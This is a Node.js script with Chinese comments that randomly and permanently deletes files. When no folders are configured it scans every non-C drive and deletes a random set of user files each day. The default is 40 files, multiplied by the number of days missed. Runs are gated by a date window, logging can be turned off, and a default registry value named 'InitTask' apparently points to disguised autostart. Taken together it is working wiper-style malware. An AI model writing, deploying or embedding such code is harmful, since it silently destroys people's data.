/**
 * 随机删除文件，配置见同目录 config.json
 * 日志写入同目录 run.log
 */

const fs = require('fs');
const path = require('path');

const CONFIG_FILE = 'config.json';
const LOG_FILE = 'run.log';

const DEFAULT_CONFIG = {
  startDate: null,
  endDate: null,
  deleteCount: 40,
  lastRunTime: null,
  deleteFolderPaths: [],
  registryScope: 'HKCU',
  regName: 'InitTask',
  maxDepth: 20,
  enableLog: false,
};

const SKIP_DIR_NAMES = new Set([
  '$recycle.bin',
  'system volume information',
  'windows',
  'program files',
  'program files (x86)',
  'programdata',
  'recovery',
  'boot',
  'efi',
  'msocache',
  'perflogs',
  'appdata',
]);

let logPath = '';
let loggingEnabled = true;

function log(msg) {
  if (!loggingEnabled) return;
  const line = `[${new Date().toISOString()}] ${msg}`;
  if (logPath) {
    try {
      fs.appendFileSync(logPath, `${line}\n`, 'utf8');
    } catch {
      /* ignore */
    }
  }
}

function expandEnv(p) {
  return String(p).replace(/%([^%]+)%/g, (_, name) => process.env[name] ?? `%${name}%`);
}

function ensureDir(dirPath) {
  const resolved = path.resolve(expandEnv(dirPath));
  if (!fs.existsSync(resolved)) {
    fs.mkdirSync(resolved, { recursive: true });
  }
  return resolved;
}

function loadConfig() {
  const deployPath = __dirname;
  const configPath = path.join(deployPath, CONFIG_FILE);
  let config;
  let usedDefault = false;

  if (fs.existsSync(configPath)) {
    try {
      const raw = JSON.parse(fs.readFileSync(configPath, 'utf8'));
      config = { ...DEFAULT_CONFIG, ...raw };
    } catch {
      config = { ...DEFAULT_CONFIG };
      usedDefault = true;
    }
  } else {
    config = { ...DEFAULT_CONFIG };
    usedDefault = true;
  }

  config.deployPath = deployPath;
  config.deleteCount = Math.max(1, parseInt(config.deleteCount, 10) || DEFAULT_CONFIG.deleteCount);
  config.maxDepth = Math.max(1, parseInt(config.maxDepth, 10) || DEFAULT_CONFIG.maxDepth);
  config.deleteFolderPaths = Array.isArray(config.deleteFolderPaths)
    ? config.deleteFolderPaths.map(expandEnv).filter(Boolean)
    : [];
  config.enableLog = config.enableLog !== false;

  return { config, configPath, usedDefault };
}

function saveConfig(configPath, config) {
  fs.writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf8');
}

function parseDateOnly(str) {
  if (!str) return null;
  const d = new Date(`${str}T00:00:00`);
  return Number.isNaN(d.getTime()) ? null : d;
}

/** 转为本地年月日 0 点 */
function toDateOnly(d) {
  return new Date(d.getFullYear(), d.getMonth(), d.getDate());
}

function formatDateOnly(d) {
  const y = d.getFullYear();
  const m = String(d.getMonth() + 1).padStart(2, '0');
  const day = String(d.getDate()).padStart(2, '0');
  return `${y}-${m}-${day}`;
}

/** 今天与 lastRunTime 相差的日历天数；无 lastRunTime 返回 null */
function daysSinceLastRun(lastRunTime) {
  if (!lastRunTime) return null;
  const last = toDateOnly(new Date(lastRunTime));
  const today = toDateOnly(new Date());
  return Math.round((today - last) / 86400000);
}

function isWithinDateRange(startDate, endDate) {
  const now = new Date();
  const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
  const start = parseDateOnly(startDate);
  const end = parseDateOnly(endDate);
  if (start && today < start) return false;
  if (end && today > end) return false;
  return true;
}

function getNonCDrives() {
  const drives = [];
  for (const letter of 'DEFGHIJKLMNOPQRSTUVWXYZ') {
    const root = `${letter}:\\`;
    try {
      if (fs.existsSync(root)) drives.push(root);
    } catch {
      /* skip */
    }
  }
  return drives;
}

function resolveScanRoots(deleteFolderPaths) {
  if (deleteFolderPaths.length > 0) {
    return deleteFolderPaths.map((p) => ensureDir(p));
  }
  const drives = getNonCDrives();
  log(`deleteFolderPaths 为空，扫描非 C 盘: ${drives.join(', ') || '无'}`);
  return drives;
}

function shouldSkipDir(dirPath) {
  const name = path.basename(dirPath).toLowerCase();
  return SKIP_DIR_NAMES.has(name) || name.startsWith('$');
}

function collectFiles(root, maxDepth, depth = 0, out = []) {
  if (depth > maxDepth) return out;

  let entries;
  try {
    entries = fs.readdirSync(root, { withFileTypes: true });
  } catch {
    return out;
  }

  for (const ent of entries) {
    const full = path.join(root, ent.name);
    if (ent.isDirectory()) {
      if (!shouldSkipDir(full)) collectFiles(full, maxDepth, depth + 1, out);
      continue;
    }
    if (!ent.isFile()) continue;
    try {
      if (fs.statSync(full).isFile()) out.push(full);
    } catch {
      /* skip */
    }
  }
  return out;
}

function pickRandom(arr, n) {
  const copy = [...arr];
  const picked = [];
  for (let i = 0; i < Math.min(n, copy.length); i++) {
    const idx = Math.floor(Math.random() * copy.length);
    picked.push(copy[idx]);
    copy.splice(idx, 1);
  }
  return picked;
}

function main() {
  logPath = path.join(__dirname, LOG_FILE);
  const { config, configPath, usedDefault } = loadConfig();
  loggingEnabled = config.enableLog;
  if (usedDefault) {
    log(`配置文件不存在或无效，使用默认配置: ${configPath}`);
  } else {
    log(`配置文件: ${configPath}`);
  }
  log(`删除数量: ${config.deleteCount}，扫描深度: ${config.maxDepth}`);

  if (!isWithinDateRange(config.startDate, config.endDate)) {
    log(
      `当前日期不在执行范围内（${config.startDate || '无'} ~ ${config.endDate || '无'}），已跳过`
    );
    log('========== 任务结束 ==========\n');
    return;
  }

  const today = toDateOnly(new Date());
  const todayStr = formatDateOnly(today);
  const dayGap = daysSinceLastRun(config.lastRunTime);

  if (config.lastRunTime) {
    const lastStr = formatDateOnly(new Date(config.lastRunTime));
    log(`上次执行: ${config.lastRunTime}`);
    log(`今天: ${todayStr}，上次执行日: ${lastStr}，间隔天数: ${dayGap}`);
  } else {
    log(`今天: ${todayStr}，尚无执行记录（首次执行）`);
  }

  if (dayGap === 0) {
    log('当天日期与上次执行日相同，跳过不执行');
    log('========== 任务结束 ==========\n');
    return;
  }

  let effectiveDeleteCount = config.deleteCount;
  if (dayGap !== null && dayGap > 0) {
    effectiveDeleteCount = config.deleteCount * dayGap;
    log(
      `间隔 ${dayGap} 天，删除数量: ${config.deleteCount} × ${dayGap} = ${effectiveDeleteCount}`
    );
  } else if (dayGap === null) {
    log(`删除数量: ${effectiveDeleteCount}`);
  } else {
    log(`间隔天数异常(${dayGap})，使用基础删除数量: ${effectiveDeleteCount}`);
  }

  const roots = resolveScanRoots(config.deleteFolderPaths);
  if (roots.length === 0) {
    log('无可用扫描路径，已退出');
    log('========== 任务结束 ==========\n');
    return;
  }
  log(`扫描路径: ${roots.join('; ')}`);

  const allFiles = [];
  for (const root of roots) {
    const before = allFiles.length;
    collectFiles(root, config.maxDepth, 0, allFiles);
    log(`扫描 ${root} +${allFiles.length - before} 个文件`);
  }

  if (allFiles.length === 0) {
    log('未找到可删除文件，已退出');
    log('========== 任务结束 ==========\n');
    return;
  }

  const targets = pickRandom(allFiles, effectiveDeleteCount);
  log(`随机选中 ${targets.length} 个文件（目标 ${effectiveDeleteCount}）`);

  let deleted = 0;
  let failed = 0;
  for (const file of targets) {
    try {
      fs.unlinkSync(file);
      log(`已删除: ${file}`);
      deleted++;
    } catch (err) {
      log(`删除失败: ${file} — ${err.message}`);
      failed++;
    }
  }

  config.lastRunTime = new Date().toISOString();
  saveConfig(configPath, config); // 无配置文件时会自动创建
  log(`完成: 成功 ${deleted}，失败 ${failed}`);
  log(`已更新 lastRunTime: ${config.lastRunTime}`);
  log('========== 任务结束 ==========\n');
}

try {
  main();
} catch (err) {
  if (!logPath) logPath = path.join(__dirname, LOG_FILE);
  try {
    const cfg = JSON.parse(
      fs.readFileSync(path.join(__dirname, CONFIG_FILE), 'utf8')
    );
    loggingEnabled = cfg.enableLog !== false;
  } catch {
    /* 使用默认 loggingEnabled */
  }
  log(`异常退出: ${err.message || err}`);
  log('========== 任务结束 ==========\n');
  process.exit(1);
}
